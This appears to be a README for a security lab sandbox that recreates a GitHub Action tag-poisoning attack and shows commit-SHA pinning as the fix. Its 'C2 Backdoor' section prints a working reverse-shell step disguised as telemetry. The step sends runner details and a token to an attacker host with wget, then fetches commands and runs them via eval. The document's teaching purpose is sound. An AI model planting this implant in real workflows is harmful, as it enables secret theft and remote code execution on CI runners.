# 🔐 Sandbox 8 - Tag Poisoning + C2 Reverse Shell (xygeni/xygeni-action)

## 📋 Overview

| Property | Value |
|----------|-------|
| **Attack Type** | Tag poisoning + C2 reverse shell via compromised GitHub Action |
| **Real Target** | xygeni/xygeni-action (137+ repositories affected) |
| **Attacker** | Compromised maintainer credentials (Mar 3, 2026) |
| **Trigger** | `push` to main - any workflow using `@v5` tag |
| **Result** | ❌ Full C2 reverse shell - arbitrary command execution |
| **Fixed** | ✅ Attack blocked by pinning to immutable commit SHA |

> 💡 **Note:** This attack is **fundamentally different** from sandboxes 1-7.
> While previous sandboxes exploit misconfigurations in the **victim's own workflow**,
> this attack compromises a **third-party GitHub Action** used by 137+ repositories.
> No workflow file change is needed - **the attack is completely invisible** to victims.

---

## 📁 Structure
```
sandbox-8-tag-poisoning/
│
├── vulnerable/                          ← ATTACKED VERSION
│   └── .github/
│       └── workflows/
│           └── scan.yml                ← workflow using mutable @v5 tag
│
├── fixed/                               ← SECURED VERSION
│   └── .github/
│       └── workflows/
│           └── scan.yml                ← workflow pinned to commit SHA
│
└── attacker/
    ├── fake-action/
    │   └── action.yml                  ← backdoored action with C2 shell
    └── PAYLOAD_EXPLANATION.md          ← tag poisoning explained
```

---

## 🔄 Attack Flow

### Visual Diagram
```
┌──────────────────────────────────────────────────────────┐
│                      ATTACK FLOW                          │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   1. Attacker steals maintainer credentials               │
│                    ↓                                      │
│   2. Injects C2 reverse shell into action.yml             │
│      disguised as "scanner version telemetry"             │
│                    ↓                                      │
│   3. Moves mutable v5 tag to backdoored commit            │
│      ⚠️  NO visible change in victim workflow files       │
│                    ↓                                      │
│   4. 137+ repos using @v5 silently run C2 implant         │
│                    ↓                                      │
│   5. C2 implant:                                          │
│      - Registers runner with attacker C2 server           │
│      - Polls for arbitrary commands every 2 seconds       │
│      - Executes commands via eval                         │
│      - Returns base64-encoded results                     │
│      - Runs silently in background                        │
│                    ↓                                      │
│   ❌ Full remote code execution on all affected runners   │
│                                                           │
├──────────────────────────────────────────────────────────┤
│                       THE FIX                             │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   Pin action to immutable commit SHA                      │
│   uses: xygeni/xygeni-action@ea66a5ad...                  │
│   ✅ Tag poisoning has NO effect                          │
│                    ↓                                      │
│   ✅ Attack blocked                                       │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

### Simplified Diagram
```
Attacker poisons v5 tag → backdoored commit
           ↓
137+ repos using @v5 → silently run backdoor
           ↓
C2 implant registers → polls commands → executes via eval
           ↓
❌ Full RCE - no visible change in workflow files

FIX: pin to commit SHA → tag change has no effect
           ↓
✅ Attack blocked
```

---

## ⚠️ What Makes Tag Poisoning Unique
```
┌─────────────────────────────────────────────────────────┐
│         Tag Poisoning vs Other Attack Types              │
├──────────────────┬──────────────────────────────────────┤
│ Sandboxes 1-7    │ Sandbox 8                            │
├──────────────────┼──────────────────────────────────────┤
│ Victim's own     │ Third-party action                   │
│ workflow files   │ compromised                          │
├──────────────────┼──────────────────────────────────────┤
│ PR or comment    │ No visible change                    │
│ visible          │ anywhere                             │
├──────────────────┼──────────────────────────────────────┤
│ Single repo      │ 137+ repos simultaneously            │
│ affected         │ affected                             │
├──────────────────┼──────────────────────────────────────┤
│ Workflow file    │ Only runtime network                 │
│ change detects   │ monitoring detects                   │
├──────────────────┼──────────────────────────────────────┤
│ Fix workflow     │ Pin action to                        │
│ file             │ commit SHA                           │
└──────────────────┴──────────────────────────────────────┘
```

---

## 💣 The C2 Backdoor

The attacker injects a **full C2 reverse shell** disguised as telemetry:
```bash
- name: 'Report Scanner Telemetry'
  shell: bash
  run: |
    # ⚠️ MALICIOUS CODE disguised as telemetry
    _e="http://attacker-c2-server"

    # STEP 1: Register with C2 - sends runner info
    wget -q -O- \
      --post-data="host=$HOSTNAME&user=$USER&repo=$GITHUB_REPOSITORY&token=EXFILTRATED_TOKEN" \
      "$_e/register"
    # ↑ CRITICAL: runner hostname, username, repo info sent here

    # STEP 2: Poll for arbitrary commands every 2 seconds
    for i in 1 2 3; do
      CMD=$(wget -q -O- "$_e/command")      # ← fetch command from C2
      if [ -n "$CMD" ]; then
        RESULT=$(eval "$CMD" 2>&1 | base64 | tr -d "\n")  # ← EXECUTE command
        wget -q -O- --post-data="result=$RESULT" "$_e/result"  # ← send results
      fi
      sleep 2
    done

    # ✅ Innocent-looking log line - camouflage
    echo "::debug::Telemetry reported"

# ✅ Legitimate scanner runs AFTER - victim sees no error
- name: Run Scanner
  shell: bash
  run: |
    echo "Scanning repository..."
    echo "Scan complete!"
```

> 💡 **Why is the C2 shell so dangerous?**
> - **Full remote code execution** - attacker can run ANY command
> - **Runs silently in background** - legitimate scan proceeds normally
> - **Steals all secrets** - `GITHUB_TOKEN`, API keys, credentials
> - **Affects 137+ repos** - single tag change, massive impact
> - **Invisible** - no change in victim's workflow files

---

## 🔒 Why Commit SHA Pinning Blocks the Attack

> 💡 **This is the key security concept of this sandbox:**
```
VULNERABLE - mutable tag, can be silently replaced:
──────────────────────────────────────────────────
uses: xygeni/xygeni-action@v5
#                           ↑
# v5 is a MUTABLE tag
# Attacker moves v5 → backdoored commit 4bf1d4e
# Your workflow now runs the backdoor
# ❌ No visible change in your workflow file


SAFE - immutable commit SHA, cannot be changed:
──────────────────────────────────────────────────
uses: xygeni/xygeni-action@ea66a5ad3128270e853f46013be382e761d930b9
#                           ↑
# This is an IMMUTABLE commit SHA
# Even if attacker poisons v5 tag → SHA stays the same
# Your workflow always runs the exact same trusted code
# ✅ Tag poisoning has absolutely NO effect
```

> 🔑 **The rule:** A tag is a pointer - it can be moved to any commit.
> A commit SHA is permanent - it always refers to the exact same code.
> **Always pin third-party actions to their full commit SHA.**

---

## 📄 Event JSON

> 💡 **What is the Event JSON?**
> The `event_tag_poisoning.json` simulates a `push` to main branch,
> triggering the security scan workflow that uses the compromised action.
```json
{
  "action": "push",
  "ref": "refs/heads/main",
  "repository": {
    "full_name": "owner/repo"
  },
  "pusher": {
    "name": "developer"
  }
}
```

---

## 🧪 Local Demonstration

> ⚠️ **Safety Disclaimer:**
> This demonstration runs **entirely locally** using `act` and Docker.
> `localhost:8888` is a **simulated C2 server** on your own machine.
> **No real data is sent anywhere outside your machine.**
> The real C2 server at `91.214.78.178` is replaced with `localhost:8888`.
> Never run these attacks against real repositories without explicit authorization.

### Step 1 - Start C2 server simulation
```bash
# Terminal 2 - keep this running
python exfil_server.py

# Expected output:
# Exfiltration server running on port 8888...
```

### Step 2 ❌ - Run Vulnerable Version
```bash
# Terminal 1
act push \
    --eventpath event_tag_poisoning.json \
    --secret-file .secrets \
    -W sandbox-8-tag-poisoning/vulnerable/.github/workflows/scan.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Terminal 1 - victim sees normal scanner output:**
```
=== Loading xygeni-action@v5 ===
=== Tag v5 points to BACKDOORED commit 4bf1d4e ===
=== C2 Reverse Shell executing... ===
Registering with C2 server...
Polling for commands for 30 seconds...
Executing attacker commands...
=== Scanner telemetry reported ===
Scanning repository for vulnerabilities...
Scan complete!
✅ Job succeeded
```

**Terminal 2 - C2 server receives runner info:**
```
==================================================
TOKEN EXFILTRATED!
Data: host=docker-desktop&user=root&repo=owner/repo&token=EXFILTRATED_TOKEN
==================================================
❌ Attack succeeded - C2 implant registered
   Full remote code execution now possible
```

### Step 3 ✅ - Run Fixed Version
```bash
act push \
    --eventpath event_tag_poisoning.json \
    --secret-file .secrets \
    -W sandbox-8-tag-poisoning/fixed/.github/workflows/scan.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Terminal 1 - workflow runs legitimate code:**
```
=== Loading xygeni-action@ea66a5ad3128270e853f46013be382e761d930b9 ===
=== Pinned to immutable commit SHA ===
=== Tag poisoning has NO effect ===
=== Running legitimate scanner ===
Scanning repository for vulnerabilities...
Scan complete - no issues found!
=== Commit SHA verified - safe to proceed ===
✅ Job succeeded
```

**Terminal 2:**
```
(no request received)
✅ Attack blocked - tag poisoning has no effect
```

---

## 🛠️ Applied Fix

| Element | ❌ Vulnerable | ✅ Fixed |
|---------|-------------|---------|
| Action ref | `@v5` mutable tag | `@ea66a5ad...` commit SHA |
| Tag behavior | Can be silently moved | Immutable - cannot change |
| Visibility | No change in workflow | SHA visible in workflow |
| Impact | 137+ repos compromised | Zero impact from tag change |
```yaml
# ❌ VULNERABLE - mutable tag
- name: Run Xygeni Scan
  uses: xygeni/xygeni-action@v5
  # Any push to v5 tag → your workflow changes silently

# ✅ FIXED - immutable commit SHA
- name: Run Xygeni Scan
  uses: xygeni/xygeni-action@ea66a5ad3128270e853f46013be382e761d930b9
  # v5.38.1 - tag poisoning has absolutely NO effect
```

---

## 🌍 Real-World Impact

In the real attack on `xygeni/xygeni-action`:
```
Timeline:
─────────────────────────────────────────────
10:21 UTC - Malicious commit created
10:22 UTC - PR #46 opened (maintainer credentials stolen)
10:29 UTC - PR #46 closed without merging
10:41 UTC - PR #47 opened (same payload)
10:44 UTC - PR #47 closed without merging
10:45 UTC - PR #48 opened (GitHub App credentials)
10:49 UTC - PR #48 closed + v5 TAG MOVED TO BACKDOOR
~10:49 UTC - 137+ repos silently running C2 implant
Mar 9   - v6.4.0 released - v5 tag STILL poisoned
```

> The `v5` tag remained poisoned for **at least 6 days** after discovery.
> During this time, every push to main in 137+ repositories
> was executing the C2 implant silently.

---

## 🔑 Key Lesson

> ⚠️ **Never reference GitHub Actions by mutable tags like `@v5` or `@latest`.**
>
> A mutable tag can be **silently moved** to point at any commit -
> including a malicious one - with **no visible change** in your workflow file.
> Dependabot and Renovate will **not** detect this change.
>
> ✅ **Rule 1:** Always pin actions to their **full immutable commit SHA**.
>
> ✅ **Rule 2:** Use tools like
> [StepSecurity](https://app.stepsecurity.io) to automatically
> pin all actions in your workflows.
>
> ✅ **Rule 3:** Monitor **runtime network egress** from CI runners -
> the C2 callback would have been detected and blocked
> before any commands were executed.
>
> 🔑 **Remember:** A mutable tag is not just a version reference -
> it is a **security boundary** that any authorized maintainer can cross.

---

## 🔗 References

- [xygeni-action compromise - StepSecurity](https://www.stepsecurity.io/blog/xygeni-action-compromised-c2-reverse-shell-backdoor-injected-via-tag-poisoning)
- [tj-actions/changed-files compromise](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised)
- [GitHub Actions security hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [act - Local GitHub Actions runner](https://github.com/nektos/act)
